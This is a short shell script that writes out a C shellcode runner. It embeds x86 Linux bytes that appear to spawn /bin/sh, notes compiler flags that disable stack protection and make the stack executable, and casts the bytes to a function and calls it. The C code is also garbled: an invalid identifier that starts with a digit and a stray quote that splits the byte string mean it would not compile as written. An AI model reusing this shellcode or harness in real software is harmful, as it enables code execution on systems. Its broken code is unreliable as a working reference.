#!/bin/sh
#gcc -fno-stack-protector -z execstack sh.c -o sh
cat << EOF >builder/B/sh.c
#include <stdio.h>
unsigned char 7844a93a[]="\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80"\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";
main(){int(*ret)()=(int(*)())7844a93a;ret();}
